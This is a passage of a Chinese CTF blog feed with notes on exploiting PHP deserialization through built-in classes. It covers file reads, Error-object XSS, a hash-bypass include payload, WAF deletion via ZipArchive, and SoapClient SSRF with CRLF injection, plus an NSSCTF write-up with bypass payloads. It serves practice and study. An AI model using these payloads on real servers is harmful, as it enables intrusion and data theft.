            "content_html": "<p>当有反序列化点但是找不到反序列化类时，可以考虑用一些原生类</p>\n<h3 id=\"一目录遍历类\"><a class=\"markdownIt-Anchor\" href=\"#一目录遍历类\">#</a> 一。目录遍历类</h3>\n<h4 id=\"1directoryiterator\"><a class=\"markdownIt-Anchor\" href=\"#1directoryiterator\">#</a> 1.DirectoryIterator</h4>\n<p>这个类会创建一个指定目录的迭代器当遇到 <code>echo</code>  输出时会触发 <code>Directorylterator</code>  中的 <code>__toString()</code>  方法，输出指定目录里面经过排序之后的第一个文件名。</p>\n<p>可以结合 glob 协议使用</p>\n<h4 id=\"2filesystemiterator\"><a class=\"markdownIt-Anchor\" href=\"#2filesystemiterator\">#</a> 2.FilesystemIterator</h4>\n<p>该类继承于 <code>Directorylterator</code> ，所以在用法上基本也是一样的。</p>\n<h4 id=\"3globiterator\"><a class=\"markdownIt-Anchor\" href=\"#3globiterator\">#</a> 3.GlobIterator</h4>\n<p>通过类名也不难看出，这是个自带 <code>glob</code>  协议的类，所以调用时就不必再加上 <code>glob://</code>  了</p>\n<h3 id=\"二文件读取类\"><a class=\"markdownIt-Anchor\" href=\"#二文件读取类\">#</a> 二。文件读取类</h3>\n<h4 id=\"1splfileobject类\"><a class=\"markdownIt-Anchor\" href=\"#1splfileobject类\">#</a> 1.SplFileObject 类</h4>\n<p>当用文件目录遍历到了敏感文件时，可以用 <code>SplFileObject</code>  类，同样通过 echo 触发 <code>SplFileObject</code>  中的 <code>__toString()</code>  方法。(该类不支持通配符，所以必须先获取到完整文件名称才行)</p>\n<p>除此之外其实 <code>SplFileObject</code>  类，只能读取文件的第一行内容，如果想要全部读取就需要用到 foreach 函数，但若题目中没有给出 foreach 函数的话，就要用伪协议读取文件的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/1.php?a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>\n<h3 id=\"三errorexceptionerrorexception类\"><a class=\"markdownIt-Anchor\" href=\"#三errorexceptionerrorexception类\">#</a> 三.Error/Exception/ErrorException 类</h3>\n<h4 id=\"1触发xss\"><a class=\"markdownIt-Anchor\" href=\"#1触发xss\">#</a> 1. 触发 xss</h4>\n<p>这个类里有 toString 方法，复现：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>]);  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);  </span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"variable\">$b</span>);  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"2绕过哈希比较\"><a class=\"markdownIt-Anchor\" href=\"#2绕过哈希比较\">#</a> 2. 绕过哈希比较</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&quot;payload&quot;</span>,<span class=\"number\">1</span>);<span class=\"variable\">$b</span>=<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&quot;payload&quot;</span>,<span class=\"number\">2</span>);  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$a</span>!=<span class=\"variable\">$b</span>)&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;<span class=\"subst\">$a</span>!=<span class=\"subst\">$b</span>&quot;</span>;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$a</span>)===<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$b</span>))&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;md5相等&quot;</span>;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">sha1</span>(<span class=\"variable\">$a</span>)===<span class=\"title function_ invoke__\">sha1</span>(<span class=\"variable\">$b</span>))&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;shq1相等&quot;</span>;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>例题:[极客大挑战 2020] Greatphp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">class SYCLOVER &#123;</span><br><span class=\"line\">    public $syc;</span><br><span class=\"line\">    public $lover;</span><br><span class=\"line\"> </span><br><span class=\"line\">    public function __wakeup()&#123;</span><br><span class=\"line\">        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;</span><br><span class=\"line\">           if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123;</span><br><span class=\"line\">               eval($this-&gt;syc);</span><br><span class=\"line\">           &#125; else &#123;</span><br><span class=\"line\">               die(&quot;Try Hard !!&quot;);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">if (isset($_GET[&#x27;great&#x27;]))&#123;</span><br><span class=\"line\">    unserialize($_GET[&#x27;great&#x27;]);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>要导入 /flag, 过滤了双引号，用 url 取反绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(~<span class=\"string\">&quot;/flag&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//%D0%99%93%9E%98</span></span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">error_reporting(0);  </span><br><span class=\"line\">class SYCLOVER &#123;  </span><br><span class=\"line\">    public $syc;  </span><br><span class=\"line\">    public $lover;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public function __wakeup()&#123;  </span><br><span class=\"line\">        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;  </span><br><span class=\"line\">            if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123;  </span><br><span class=\"line\">                eval($this-&gt;syc);  </span><br><span class=\"line\">            &#125; else &#123;  </span><br><span class=\"line\">                die(&quot;Try Hard !!&quot;);  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        &#125;    &#125;&#125;  </span><br><span class=\"line\">$str=&quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;  </span><br><span class=\"line\">$payload1=new Error($str,1);$payload2=new Error($str,2);  </span><br><span class=\"line\">$a=new SYCLOVER();  </span><br><span class=\"line\">$a-&gt;syc=$payload1;  </span><br><span class=\"line\">$a-&gt;lover=$payload2;  </span><br><span class=\"line\">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>\n<h3 id=\"四其他类\"><a class=\"markdownIt-Anchor\" href=\"#四其他类\">#</a> 四。其他类</h3>\n<h4 id=\"1reflectionclass类\"><a class=\"markdownIt-Anchor\" href=\"#1reflectionclass类\">#</a> 1.ReflectionClass 类</h4>\n<p><strong>ReflectionMethod</strong> 类报告有关方法的信息。<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvY2xhc3MucmVmbGVjdGlvbm1ldGhvZC5waHA=\">官方文档</span><br>\n复现:<br>\n![[Pasted image 20230608151138.png]]</p>\n<h4 id=\"2ziparchive-文件操作\"><a class=\"markdownIt-Anchor\" href=\"#2ziparchive-文件操作\">#</a> 2.ZipArchive 文件操作</h4>\n<p>可以通过本类执行一些文件操作，在 CTF 可以用来删除 waf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$a=new ZipArchive();  </span><br><span class=\"line\">$a-&gt;open(&#x27;waf.php&#x27;,ZipArchive::OVERWRITE);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>ZipArchive::OVERWRITE: 总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖，因为没有保存，所以效果就是删除了 test.php</p>\n<h4 id=\"3soapclient__call\"><a class=\"markdownIt-Anchor\" href=\"#3soapclient__call\">#</a> 3.SoapClient::__call</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">SoapClient</span>(<span class=\"literal\">null</span>,<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;uri&#x27;</span>=&gt;<span class=\"string\">&#x27;test&#x27;</span>, <span class=\"string\">&#x27;location&#x27;</span>=&gt;<span class=\"string\">&#x27;http://192.168.95.122:8765&#x27;</span>));  </span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>;  </span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$b</span>);  </span><br><span class=\"line\"><span class=\"variable\">$c</span>-&gt;<span class=\"title function_ invoke__\">not_exists_function</span>();</span><br></pre></td></tr></table></figure>\n<p>192.168.95.122 是我 kali 的地址<br>\n！[[Pasted image 20230608214231.png]]<br>\n 从图片可以看出 SOAPAction 参数可控，我们可以在这里注入恶意的换行，这样就可以控制 POST 提交的 header</p>\n<p>但是当想传入 cookie 时，Content-Type 在 SOAPAction 的上面，无法控制 Content-Type, 但在 User-Agent 后面，而 user-agent 可以注入 CRLF, 控制 Content-Type 的值</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"variable\">$target</span>=<span class=\"string\">&#x27;http://192.168.95.122:2222&#x27;</span>;  </span><br><span class=\"line\"><span class=\"variable\">$post_string</span> = <span class=\"string\">&#x27;data=something&#x27;</span>;  </span><br><span class=\"line\"><span class=\"variable\">$headers</span> = <span class=\"keyword\">array</span>(  </span><br><span class=\"line\">    <span class=\"string\">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,  </span><br><span class=\"line\">    <span class=\"string\">&#x27;Cookie: PHPSESSID=my_session&#x27;</span>  </span><br><span class=\"line\">);  </span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">SoapClient</span>(<span class=\"literal\">null</span>,<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;location&#x27;</span> =&gt; <span class=\"variable\">$target</span>,<span class=\"string\">&#x27;user_agent&#x27;</span>=&gt;<span class=\"string\">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class=\"title function_ invoke__\">join</span>(<span class=\"string\">&#x27;^^&#x27;</span>,<span class=\"variable\">$headers</span>).<span class=\"string\">&#x27;^^Content-Length: &#x27;</span>.(<span class=\"keyword\">string</span>)<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$post_string</span>).<span class=\"string\">&#x27;^^^^&#x27;</span>.<span class=\"variable\">$post_string</span>,<span class=\"string\">&#x27;uri&#x27;</span>      =&gt; <span class=\"string\">&quot;aaab&quot;</span>));  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"variable\">$aaa</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$b</span>);  </span><br><span class=\"line\"><span class=\"variable\">$aaa</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;^^&#x27;</span>,<span class=\"string\">&quot;\\r\\n&quot;</span>,<span class=\"variable\">$aaa</span>);  </span><br><span class=\"line\"><span class=\"variable\">$aaa</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;&amp;&#x27;</span>,<span class=\"string\">&#x27;&amp;&#x27;</span>,<span class=\"variable\">$aaa</span>);  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$aaa</span>;  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$aaa</span>);  </span><br><span class=\"line\"><span class=\"variable\">$c</span>-&gt;<span class=\"title function_ invoke__\">not_exists_function</span>();  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>![[Pasted image 20230608224011.png]]</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/04/nssctf3/",
            "url": "https://hq185187.github.io/2023/06/04/nssctf3/",
            "title": "NSSCTF3",
            "date_published": "2023-06-04T03:29:05.659Z",
            "content_html": "<h2 id=\"31鹤城杯-2021middle-magic\"><a class=\"markdownIt-Anchor\" href=\"#31鹤城杯-2021middle-magic\">#</a> 31.[鹤城杯 2021] Middle magic</h2>\n<p>考点:</p>\n<ul>\n<li>绕过 preg_mathch 函数</li>\n<li>sha1 弱类型比较</li>\n<li>php json 绕过</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;./flag.php&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;./result.php&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>]) &lt; <span class=\"number\">20</span>)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$aaa</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class=\"string\">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/pass_the_level_1#/&#x27;</span>, <span class=\"variable\">$aaa</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;here is level 2&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;admin&#x27;</span>]) <span class=\"keyword\">and</span> <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;root_pwd&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;admin&#x27;</span>] == <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;root_pwd&#x27;</span>])</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;</span><br><span class=\"line\">            <span class=\"comment\">// START FORM PROCESSING</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">sha1</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;admin&#x27;</span>]) === <span class=\"title function_ invoke__\">sha1</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;root_pwd&#x27;</span>]))&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;level_3&#x27;</span>])) &#123;</span><br><span class=\"line\">                    <span class=\"variable\">$level_3</span> = <span class=\"title function_ invoke__\">json_decode</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;level_3&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (<span class=\"variable\">$level_3</span>-&gt;result == <span class=\"variable\">$result</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success:&quot;</span>.<span class=\"variable\">$flag</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you never beat me!&quot;</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;out&quot;</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&quot;no&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// perform validations on the form data</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;nonono!&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>第一个 preg_replace 绕过相当于绕过 preg_match, 正则写法有缺陷， <code>.</code>  用于任意字符匹配但是不包括换行符，而且 <code>^$界定了必须在同一行</code> ，否则匹配不到，直接利用 %0a 换行绕过</p>\n</li>\n<li>\n<p>第二个简单 sha1 弱类型比较，直接数组绕过就行</p>\n</li>\n<li>\n<p>第三个直接用布尔 true 绕过</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?aaa=%0apass_the_level_1%23</span><br><span class=\"line\">为什么不用#?因为#在url中表示界定符</span><br><span class=\"line\">post:</span><br><span class=\"line\">admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:true&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"32nisactf-2022is-secret\"><a class=\"markdownIt-Anchor\" href=\"#32nisactf-2022is-secret\">#</a> 32.[NISACTF 2022]is secret</h2>\n<p>dirsearch 扫一下目录发现 robots.txt,secret,console<br>\n 进入 robots.txt 显示这是一个安卓程序<br>\n进入 secret 可以传 <code>?secret=&#123;&#123;7*6&#125;&#125;</code>  返回调试报错<br>\n发现是 rc4 加密，密钥是 HereIsTreasure, 用大佬脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64  </span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> parse  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rc4_main</span>(<span class=\"params\">key=<span class=\"string\">&quot;init_key&quot;</span>, message=<span class=\"string\">&quot;init_message&quot;</span></span>):  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;RC4加密主函数&quot;)  </span></span><br><span class=\"line\">s_box = rc4_init_sbox(key)  </span><br><span class=\"line\">crypt = <span class=\"built_in\">str</span>(rc4_excrypt(message, s_box))  </span><br><span class=\"line\"><span class=\"keyword\">return</span> crypt  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rc4_init_sbox</span>(<span class=\"params\">key</span>):  </span><br><span class=\"line\">s_box = <span 